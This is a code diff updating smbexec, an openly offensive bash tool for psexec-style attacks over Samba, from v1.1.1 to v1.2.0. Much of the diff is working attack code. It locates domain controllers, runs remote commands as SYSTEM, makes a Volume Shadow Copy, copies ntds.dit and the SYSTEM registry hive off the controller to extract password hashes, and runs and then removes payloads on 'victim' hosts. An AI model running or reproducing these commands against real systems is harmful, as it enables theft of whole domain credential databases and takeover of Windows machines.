@@ -22,8 +22,9 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 11/11/2012 v1.1.1
+# Last update - 11/20/2012 v1.2.0
 #############################################################################################
+
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
 	isxrunning=
@@ -41,6 +42,11 @@ trap f_ragequit 2
 
 # Find the files and set the path values based on machine architecture
 smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')
+
+if [ ! -e $smbexecpath/smbexeclient ]; then
+	echo -e "\n\e[1;31m[!] You have to compile the executables first.\e[0m\n\e[1;33m[*] Please run the installer and select option #1.\e[0m\n" 1>&2
+	exit 1
+fi
 
 # Check if its Fedora or Red Hat, because they feel the need to be "special"
 if [ -e /etc/redhat-release ]; then
@@ -127,7 +133,7 @@ f_vanish(){
 		clear
 		f_banner
 		lhost=
-		
+
 		echo -e "\n\e[1;33mYou have chosen the following payload - $payload\e[0m"
 
 		# Gather info to build standard payload		
@@ -283,11 +289,11 @@ f_vanish(){
 f_banner(){
 	clear
 	echo "************************************************************"
-	echo -e "		      \e[1;36msmbexec - v1.1.1\e[0m       "
+	echo -e "		      \e[1;36msmbexec - v1.2.0\e[0m       "
 	echo "	A rapid psexec style attack with samba tools              "
 	echo "      Original Concept and Script by Brav0Hax & Purehate    "
-	echo "              Codename - Diamond in the Rough	          "
-	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m Smash!"
+	echo "              Codename - Himalayan Salt Room	          "
+	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m \e[1;37mSmash!\e[0m"
 	echo "************************************************************"
 	echo
 }
@@ -389,7 +395,6 @@ f_smbauth
 f_finddcs
 
 read -e -p " Domain Controller IP address: " tf
-#if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi
 
 if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
 	echo $tf > /tmp/smbexec/rhost.txt
@@ -401,14 +406,94 @@ else
 	f_insideprompt
 fi
 
+f_ntdspath
+}
+
+f_ntdspath(){
+
+ntdsdrive=
+read -e -p " Enter NTDS Drive [C:]: " ntdsdrive
+
+if [ -z $ntdsdrive ]; then
+	ntdsdrive="C:"
+fi
+
+ntdspath=
+read -e -p " Enter NTDS Path [\\Windows\\NTDS]: " ntdspath
+if [ -z $ntdspath ]; then
+	ntdspath="\\Windows\\NTDS"
+fi
+
+ntdssuccess=
+echo -e "\n\e[1;33m[*]Checking to see if the ntds.dit file exists in the provided path\e[0m"
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $ntdsdrive$ntdspath\\ntds.dit ECHO Success" > /tmp/smbexec/ntds.chk
+ntdssuccess=$(cat /tmp/smbexec/ntds.chk|grep -o Success)
+
+if [ -z $ntdssuccess ]; then
+	echo -e "\e[1;31m[-] The ntds.dit file does not exist in the path provided.\e[0m\n"
+	sleep 5
+	f_ntdspath
+else
+	echo -e "\t\e[1;32m[+] The ntds.dit file was found in the path provided...\e[0m\n"
+	sleep 3
+	f_savepath
+fi
+
+}
+
+f_savepath(){
+
+tempdrive=
+read -e -p " Enter the Drive to save the Shadow Copy and SYS key [C:]: " tempdrive
+
+if [ -z $tempdrive ]; then
+	tempdrive="C:"
+fi
+
+temppath=
+read -e -p " Enter the Path to save the Shadow Copy and SYS key [\\Windows\\TEMP]: " temppath
+if [ -z $temppath ]; then
+	temppath="\\Windows\\TEMP"
+fi
+
+tempsuccess=
+echo -e "\n\e[1;33m[*]Checking to see if the provided path exists\e[0m"
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C IF EXIST $tempdrive$temppath ECHO Success" > /tmp/smbexec/temppath.chk
+pathsuccess=$(cat /tmp/smbexec/temppath.chk|grep -o Success)
+
+if [ -z $pathsuccess ]; then
+	echo -e "\t\e[1;31m[-] The path provided does not exist...\e[0m\n"
+	sleep 5
+	f_savepath
+else
+	echo -e "\t\e[1;32m[+] The path provided exists...\e[0m\n"
+fi
+
+echo -e "\e[1;33m[*]We have to make sure there is enough disk space available before we do the Shadow Copy\e[0m"
+$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C dir $ntdsdrive$ntdspath\\ntds.dit" > /tmp/smbexec/ntds.size
+disksize=$(cat /tmp/smbexec/ntds.size |grep free|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed -e 's/,//g')
+filesize=$(cat /tmp/smbexec/ntds.size |grep File|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed 's/,//g')
+
+if [ "$filesize" -gt "$disksize" ]; then
+	echo -e "\e[1;31m[-] Not enough diskspace available to save the ntds.dit file...\e[0m"
+	sleep 5
+	f_mainmenu
+else
+	echo -e "\t\e[1;32m[+] Plenty of diskspace...\e[0m"
+	f_createvss
+fi
+}
+
+f_createvss(){
 for i in $(cat $RHOSTS); do
 	mkdir $logfldr/hashes/DC
 	# Create a Volume Shadow Copy
 	echo -e "\n\e[1;33mAttempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
-	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C vssadmin create shadow /for=c:" &> /tmp/smbexec/vssdc.out
+	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin create shadow /for=$ntdsdrive" &> /tmp/smbexec/vssdc.out
 	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
 	if [ -z "$vscpath" ]; then
 		echo -e "\t\e[1;31m[!] Could not create a Volume Shadow Copy...\e[0m"
+		cat /tmp/smbexec/vssdc.out
 		sleep 5
 		f_freshstart
 		f_mainmenu
@@ -416,11 +501,14 @@ for i in $(cat $RHOSTS); do
 		echo -e "\t\e[1;32m[+] Volume Shadow Copy Successfully Created...\e[0m"
 		sleep 2
 	fi
+	
 	echo -e "\n\e[1;33mAttempting to copy the ntds.dit file from the Volume Shadow Copy...\e[0m"
 	sleep 2
-	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C copy $vscpath\WINDOWS\NTDS\ntds.dit C:\\Windows\\Temp\\ntds.dit && reg.exe save HKLM\SYSTEM C:\\Windows\\Temp\\sys" &> /dev/null
-	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\ntds.dit $logfldr/hashes/DC/ntds.dit" &> /dev/null
-	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sys $logfldr/hashes/DC/sys" &> /dev/null
+	sharedrive="$(echo $tempdrive| cut -d":" -f1)$"
+	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C copy $vscpath\\$ntdspath\\ntds.dit $tempdrive$temppath\\ntds.dit && reg.exe save HKLM\SYSTEM $tempdrive$temppath\\sys" &> /dev/null
+	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$tf/"$sharedrive" -c "get $temppath\\ntds.dit $logfldr/hashes/DC/ntds.dit" &> /dev/null
+	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$tf/"$sharedrive" -c "get $temppath\\sys $logfldr/hashes/DC/sys" &> /dev/null
+	
 	if [ ! -e $logfldr/hashes/DC/ntds.dit ] && [ ! -e $logfldr/hashes/DC/sys ]; then
 		echo -e "\t\e[1;31m[!] Could not grab ntds.dit & sys files from the Domain Controller...\e[0m"
 		sleep 5
@@ -428,10 +516,13 @@ for i in $(cat $RHOSTS); do
 		f_mainmenu
 	else
 		echo -e "\t\e[1;32m[+] We have ntds.dit & sys files...let's get some hashes\e[0m"
-		sleep 2
+		sleep 3
 	fi
 	#cleanup the host
-	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL C:\Windows\Temp\sys && DEL C:\Windows\Temp\ntds.dit" &> /dev/null
+	echo -e "\n\e[1;33mAttempting to remove the files created from the Domain Controller...\e[0m"
+	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
+	#echo -e "\n\e[1;33mAttempting to remove the shadow copy created from the Domain Controller...\e[0m"
+	#$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
 done
 
 f_esedbexport
@@ -444,6 +535,10 @@ f_mainmenu
 f_finddcs(){
 dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/pdc.txt
 dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/dcs.txt
+dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.net |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
+dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.net |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
+dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.org |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
+dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.org |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
 
 if [ -s /tmp/smbexec/pdc.txt ]; then
 	echo -e "\nPrimary Domain Controller\n========================="
@@ -735,20 +830,20 @@ f_getsome(){
 			echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
 			if [ "$isadmin" == "1" ]; then
 				ADMINPATH=$prepath$RPATH
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			if [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			else
-				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
+				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
 			fi
 
 			echo $! > /tmp/smbexec/winexe.pid #grab the pid so we can kill it
@@ -791,16 +886,16 @@ f_cleanup(){
 			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C taskkill /IM $SMBFilename /F" &> /tmp/smbexec/error.jnk
 			echo -e "\n\e[1;33mRemoving the file from the victim, please standby\e[0m"
 			if [ ! -z $cemptyrpath ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ "$isadmin" == "1" ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$oddshare" ]; then
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			elif [ ! -z "$superoddshare" ]; then
 				#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
 			else
-				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
+				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
 			fi
 		done
 	else
@@ -885,7 +980,6 @@ f_mainmenu(){
 		*) f_mainmenu
 	esac
 }
-
 # run as root
 if [ "$(id -u)" != "0" ]; then
 	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
